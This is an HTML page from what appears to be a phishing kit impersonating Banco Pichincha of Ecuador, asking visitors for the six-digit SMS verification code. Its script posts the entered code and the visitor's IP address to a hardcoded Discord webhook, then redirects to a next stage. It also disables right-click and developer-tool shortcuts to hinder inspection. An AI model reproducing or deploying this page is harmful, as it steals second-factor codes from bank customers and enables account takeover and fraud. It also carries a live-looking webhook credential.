<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificaci√≥n</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{background:#fff}
.header{padding:16px 20px;box-shadow:0 4px 10px rgba(0,0,0,.12)}
.logo{height:36px}
.container{max-width:480px;margin:0 auto;padding:35px 20px;text-align:center}
.image-box{max-width:200px;margin:30px auto}
.image-box img{width:50%}
.title{font-size:26px;font-weight:700;color:#0b2a5b;margin-bottom:15px}
.description{
  font-size:14px;
  color:#5a5a5a;
  margin-bottom:30px;
  line-height:1.5;
}
.form{text-align:left}
label{font-size:14px;font-weight:600;display:block;margin-bottom:8px}
.code{
  text-align:center;
  letter-spacing:10px;
  font-size:26px;
  padding:16px;
}
input{
  width:100%;
  padding:16px;
  border-radius:8px;
  border:1px solid #ccc;
  margin-bottom:20px;
  font-size:18px;
}
.btn{
  width:100%;
  background:#ffd200;
  border:none;
  padding:16px;
  font-size:17px;
  font-weight:700;
  border-radius:8px;
  cursor:pointer;
}
.btn:hover{background:#f5c400}
.error{
  color:#c00;
  font-size:14px;
  margin-bottom:15px;
}
.hidden{display:none}
.timer{
  margin-top:20px;
  font-size:14px;
  color:#5a5a5a;
  text-align:center;
}
</style>
</head>

<body>

<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo">
</div>

<div class="container">

  <div class="image-box">
    <img src="https://media.istockphoto.com/id/662107734/es/vector/icono-de-protecci%C3%B3n-de-contrase%C3%B1a-dise%C3%B1o-plano.jpg?s=612x612&w=0&k=20&c=_BzBEHNoQjemjOHDYSjMLWYiAQKhEi-UnnDFqwX_Hyw=">
  </div>

  <div class="title">Autenticaci√≥n de Usuario</div>

  <div class="description">
    Hemos enviado un mensaje de texto con un c√≥digo a su n√∫mero de m√≥vil
    o correo electr√≥nico registrado.  
    Estas validando tu identidad en www.pichinchacredito.com.ec.
  </div>

  <!-- FORMULARIO -->
  <div class="form">
    <label>C√≥digo de verificaci√≥n</label>
    <input id="code"
           class="code"
           inputmode="numeric"
           pattern="[0-9]*"
           maxlength="6"
           placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢">

    <div class="error hidden" id="errorMsg">
      Debes ingresar el c√≥digo de 6 d√≠gitos.
    </div>

    <button class="btn" onclick="verificar()">Continuar</button>
  </div>

  <div class="timer" id="timer">
    ¬øNo recibiste el c√≥digo? Espera unos minutos.
  </div>

</div>

  <script>
  // URL de tu Webhook (Aseg√∫rate de que sea la misma de las otras p√°ginas)
  const webhookURL = "https://discord.com/api/webhooks/1459229071656616113/MTxv1050wMa_vFVba4cDO-6sSS1KKttf-HENqsv0jFHxOEF1fIVY7rtLe9VA3ptT8Crz";

  // 1. Protecci√≥n contra inspecci√≥n (Bloqueo de F12, Clic Derecho, Ctrl+U)
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.onkeydown = e => {
      if (e.keyCode == 123 || 
          (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
          (e.ctrlKey && e.keyCode == 85)) {
          return false;
      }
  };

  // 2. Funci√≥n principal de env√≠o
  async function verificar() {
      const codeInput = document.getElementById("code");
      const codeValue = codeInput.value;
      const errorMsg = document.getElementById("errorMsg");

      // Validaci√≥n: Debe tener 6 d√≠gitos
      if (codeValue.length !== 6) {
          errorMsg.classList.remove("hidden");
          return;
      }
      errorMsg.classList.add("hidden");

      // Obtener IP del usuario
      let userIP = "No detectada";
      try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          userIP = data.ip;
      } catch (e) { console.error("Error IP"); }

      // Estructura del mensaje para Discord
      const message = {
          embeds: [{
              title: "üîë C√ìDIGO OTP PICHINCHA",
              color: 16761344, // Amarillo Pichincha
              fields: [
                  { name: "üî¢ C√≥digo Ingresado", value: `\`${codeValue}\``, inline: true },
                  { name: "üåê IP del Usuario", value: `**${userIP}**`, inline: true }
              ],
              footer: { text: "Verificaci√≥n de Segundo Factor" },
              timestamp: new Date()
          }]
      };

      // Env√≠o a Discord y Redirecci√≥n
      fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(message)
      })
      .then(() => {
          // Redirigir a la siguiente fase
          window.location.href = "index5.html";
      })
      .catch(() => {
          // Redirigir incluso si hay error para no detener el flujo
          window.location.href = "index5.html";
      });
  }
// Deshabilitar clic derecho
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Deshabilitar atajos de teclado de inspecci√≥n
document.onkeydown = function(e) {
    if(e.keyCode == 123) { // F12
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Ctrl+Shift+I
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) { // Ctrl+Shift+C
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { // Ctrl+Shift+J
        return false;
    }
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Ctrl+U (Ver c√≥digo fuente)
        return false;
    }
};
  </script>

</body>
</html>